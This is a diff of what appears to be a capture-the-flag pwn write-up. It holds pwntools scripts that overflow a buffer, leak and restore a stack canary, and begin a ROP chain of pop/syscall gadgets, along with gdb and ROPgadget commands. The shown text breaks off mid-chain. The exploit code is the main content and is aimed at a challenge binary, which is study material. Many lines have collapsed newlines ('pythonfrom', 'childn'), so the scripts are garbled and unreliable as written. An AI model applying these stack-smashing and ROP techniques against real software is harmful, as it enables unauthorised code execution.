@@ -9,19 +9,22 @@ gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r
 
 info inferiorsinferior 1
 
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
 sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
 sh.interactive()
 
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
 sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
 sh.interactive()
 
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
 canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
@@ -30,7 +33,8 @@ sh.interactive()
 
 ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3
 
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 #sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
 canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
@@ -42,63 +46,32 @@ sh.interactive()
 
 ```
 set follow-fork-mode childset detach-on-fork off
-```
-
-
-
-```
 gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r
-```
-
-
-
-```
 info inferiorsinferior 1
-```
-
-
-
-```
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
 sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
 sh.interactive()
-```
-
-
-
-```
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
 sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
 sh.interactive()
-```
-
-
-
-```
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
 sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
 canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
 sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8 + "E"*8sh.sendafter("once again?",payload)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
 sh.interactive()
-```
-
-
-
-```
 ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3
-```
-
-
-
-```
-#!/usr/bin/env pythonfrom pwn import *
+#!/usr/bin/env python
+from pwn import *
 context.log_level = 'debug'
-#sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
+    #sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
 canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
 sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)
 pop_rax = 0x0000000000450277pop_rdi = 0x000000000040213fpop_rsi = 0x000000000040a1aepop_rdx_rbx = 0x0000000000485febsyscall = 0x000000000041ac26ret = 0x41ac28bss = 0x4CB800
